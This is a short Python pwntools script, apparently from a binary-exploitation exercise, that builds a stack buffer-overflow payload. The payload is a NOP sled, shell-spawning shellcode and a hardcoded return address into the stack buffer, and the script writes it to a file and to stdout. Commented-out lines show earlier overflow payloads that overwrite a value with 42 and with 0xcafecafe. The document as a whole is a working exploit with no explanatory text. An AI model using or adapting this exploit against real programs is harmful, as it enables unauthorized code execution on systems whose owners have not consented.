import sys; 
from pwn import *

#print((b'A'*128 + (42).to_bytes(4,'little')).decode())
#sys.stdout.buffer.write(b'A'*128 + (42).to_bytes(4,'little'))
#sys.stdout.buffer.write(b'A'*10 + (0xcafecafe).to_bytes(4, 'little'))
#sys.stdout.buffer.write(b'A'*10 + + b'0'*15)

context.update(arch= 'amd64', os='linux')

shellcode = shellcraft.sh()
shellcode_b = asm(shellcode)


offset = 128 + 12 + 4 + 8   #buffer + offset from response + response + rbp = 152
rbp_addr = 0x00007fffffffdca0
buff_addr = rbp_addr - 0x90

nop_bytes = asm('nop')        # assemble a nop for amd64
print(nop_bytes)              # b'\x90'

filler = offset - len(shellcode_b)  #152-48=104 bytes


payload = filler*nop_bytes + shellcode_b + (buff_addr).to_bytes(8,'little')

with open('payload.bin', 'wb') as f:
    f.write(payload)


sys.stdout.buffer.write(payload)
print(payload)